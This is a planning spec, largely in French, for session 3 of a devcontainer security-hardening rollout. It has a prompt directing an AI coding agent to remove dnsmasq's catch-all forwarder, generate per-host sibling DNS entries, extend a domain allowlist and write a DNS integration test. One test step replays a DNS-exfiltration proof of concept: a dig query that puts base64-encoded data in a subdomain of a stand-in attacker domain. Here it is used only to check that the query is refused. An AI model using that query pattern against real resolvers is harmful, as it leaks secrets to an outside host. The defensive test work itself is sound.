# Session 3 — dnsmasq-strict

> **Effort** : ~60 min | **Dependencies** : sessions 1 + 2 (delivered)

## Goal

Appliquer le fix DNS qui ferme le gap #9 : **drop le catch-all
`server=127.0.0.11`** de `dnsmasq.conf` pour que dnsmasq retourne
REFUSED sur les domaines non-allowlistés (au lieu de forward la query
vers Docker DNS → host DNS → public DNS hierarchy — la mécanique exacte
qui permet l'exfil DNS via subdomain query payload).

Pour préserver la résolution des **siblings Docker légitimes**
(claude-bridge, host.docker.internal, etc.), **généraliser la logique
hardcodée claude-bridge** de `init-firewall.sh:280-299` en boucle sur
`direct-tcp-allow.txt` — chaque entrée `host:port` produit
`server=/<host>/127.0.0.11` à boot, source-of-truth unique pour le
direct-TCP bypass ET la sibling DNS.

Pré-appliquer la pré-allowlist cumulée des sessions 1+2 sur
`domains.txt` : session 1 contribue 0 (pas de manifest applicatif),
session 2 contribue 2 (`bridge.claudeusercontent.com`,
`code.claude.com`) — cf. LOG.md §2 pour la justification.

Créer le test d'intégration `test-dns-strict.sh` qui valide
empiriquement les 4 critères de réussite.

## Prompt to paste

`````
Je démarre la session 3 du rollout `devcontainer-security-hardening-v2`.

Entry point : `/workspace/plans/devcontainer-security-hardening-v2/ROLLOUT.md`
Read also :
- `STATUS.md` (where we are — sessions 1+2 ✅, session 3 next)
- `LOG.md` (sessions 1+2 traces — notamment §2 delta hosts catégorisé)
- `EXISTING.md` (DNS architecture today, gap #9)
- `sessions/session-3-dnsmasq-strict.md` (this spec)

Goal : appliquer le fix DNS (drop catch-all + sibling-resolve loop +
pré-allowlist cumulée + test intégration).

Pourquoi maintenant : sessions 1+2 ont validé la pré-allowlist (vide
côté manifests, +2 CDN Anthropic côté logs). Le terrain est prêt pour
serrer dnsmasq sans casser de chemin légitime au premier rebuild
strict mode.

Étapes :

1. **Drop catch-all dans `templates/v2/firewall/dnsmasq.conf`** :
   - Supprimer la ligne `server=127.0.0.11` (actuellement L16)
   - Remplacer le commentaire L14-15 par une note expliquant que la
     sibling DNS (claude-bridge, host.docker.internal, etc.) est
     désormais drivée par les lignes `server=/<host>/127.0.0.11`
     émises à boot par `init-firewall.sh` à partir de
     `direct-tcp-allow.txt`.

2. **Généraliser le sibling-resolve block dans `templates/v2/init-firewall.sh`** :
   - Localiser le bloc hardcoded L280-299 (claude-bridge only)
   - Remplacer par une boucle qui :
     - Lit `direct-tcp-allow.txt`
     - Skip lignes vides et commentaires (`^\s*#`, `^\s*$`)
     - Pour chaque entrée `host:port`, extraire `host` (split sur `:`)
     - Cas spécial : `host` literal = `host.docker.internal` (déjà
       résolu via extra_hosts, ne PAS écraser — skip cette entry
       côté DNS)
     - Emit `server=/<host>/127.0.0.11` dans `$GENERATED_DNSMASQ_CONF`
     - Conserver le `sed -i -E '/^server=\/<host>\//d'` defensive
       pour éviter les doublons si compile-policy.py a déjà émis une
       ligne pour ce host
   - Conserver le `cname=claude-bridge.local,claude-bridge` ssi
     `claude-bridge` est dans `direct-tcp-allow.txt` (decider :
     l'émettre auto pour TOUTE entrée non-host, sous forme
     `cname=<host>.local,<host>`)

3. **Appliquer pré-allowlist cumulée à `templates/v2/firewall/domains.txt`** :
   - Section "Core Anthropic" ou nouvelle sous-section, ajouter :
     ```
     [GET] bridge.claudeusercontent.com     # Claude Code Chrome bridge CDN (computer use artifacts)
       /chrome/*                            #   per-session UUID-keyed assets
     
     [GET] code.claude.com                  # Claude Code docs map (UA Claude-User)
       /docs/*                              #   /docs/en/claude_code_docs_map.md etc.
     ```
   - **Pas** de wildcard parent (cf. ROLLOUT decision « no wildcard
     parent promotion ») — les sous-domaines sont listés littéralement.

4. **Créer `templates/v2/tests/integration/test-dns-strict.sh`** :
   Tests minimum (suivre le style des autres `test-*.sh` du repo) :
   - `dig non-existent-evil-domain.com @127.0.0.53` → status REFUSED
   - `dig api.anthropic.com @127.0.0.53` → returns IP (regression
     check sur allowlist normale)
   - `dig bridge.claudeusercontent.com @127.0.0.53` → returns IP
     (regression session 2)
   - `dig code.claude.com @127.0.0.53` → returns IP (regression session 2)
   - `dig claude-bridge @127.0.0.53` → returns 172.x.x.x (Docker peer)
     SEULEMENT si `claude-bridge:9223` est décommenté dans
     `direct-tcp-allow.txt` (sinon skip avec un message clair —
     comportement mode `cloud`)
   - `dig host.docker.internal @127.0.0.53` → returns `192.168.65.254`
     (regression : doit toujours fonctionner via /etc/hosts ou
     extra_hosts, **pas** via dnsmasq car ce host n'est pas en
     allowlist)
   - `dig $(echo secret | base64).attacker.com @127.0.0.53` → status
     REFUSED (PoC #9 du v1 — la query *ne doit pas* leak upstream)
   - Exit 0 si tous critères verts, 1 sinon. Output verbeux pour
     debug.

5. **Reload + test in vivo** :
   - `pkill -HUP dnsmasq` (ou rebuild container si nécessaire pour
     prendre les changements baked)
   - Exécuter le `test-dns-strict.sh` créé en étape 4
   - Verify chaque assertion. Si une échoue → STOP, re-plan (cf.
     CLAUDE.md §1).

6. **Vérifier la non-régression côté workflows Claude Code typiques** :
   - `curl -sI https://api.anthropic.com` via le mitm → 200 ou 403
     (mais pas DNS error)
   - `curl -sI https://bridge.claudeusercontent.com/chrome/test` →
     pas REFUSED au DNS, peut-être 403 path-level
   - Vérifier que les blocks.log ne se peuplent pas de nouveaux
     `host_not_in_policy` après le serrage

Out of scope :
- Modifier `compile-policy.py` (jamais en v2)
- Modifier les addons mitmproxy
- Modifier `policy.d/*.yaml` (les policies par host)
- Lancer la validation adversariale complète (session 4)
- Investiguer `169.254.169.254` (out of v2 rollout)
- Promouvoir `bridge.claudeusercontent.com` ou `code.claude.com` en
  wildcards parents (ROLLOUT decision « no wildcard parent
  promotion »)

DoD at the end of this session :
1. **STATUS.md** : flip session 3 row 📋 → ✅, prompt link → —, bump
   Delivered counter (2→3), refresh "Next focus" to session 4.
2. **LOG.md** : append `## 3 — dnsmasq-strict` section dated today
   avec files touched + What / Why / Decisions / Gotchas / Tests /
   Commit. Inclure le diff résumé de `dnsmasq.conf` et le bloc avant/
   après de `init-firewall.sh`.
3. **EXISTING.md** : update la section "DNS architecture today" pour
   refléter le nouvel état (drop catch-all + loop). La section "gap
   #9" peut être renommée "gap #9 (closed in session 3)".
4. **Créer `sessions/session-4-adversarial-validation.md`** : spec de
   la session gate avec replay du PoC #9 (`dig
   $(base64 secret).attacker.com @127.0.0.53` → REFUSED) + suite
   complète des 3 critères du threat model + diff comportemental avec
   `main`.
5. **Propose a commit** (do NOT commit without explicit user
   confirmation). Message proposé :
   `fix(security): close DNS exfil gap #9 — drop dnsmasq catch-all,
   loop sibling-resolve over direct-tcp-allow.txt`
`````

## Next session

Session 4 (adversarial-validation, gate) — to be created at the end of
session 3 following the same minimal shape as this file. Validation
empirique de la fermeture du gap #9 + non-régression complète.
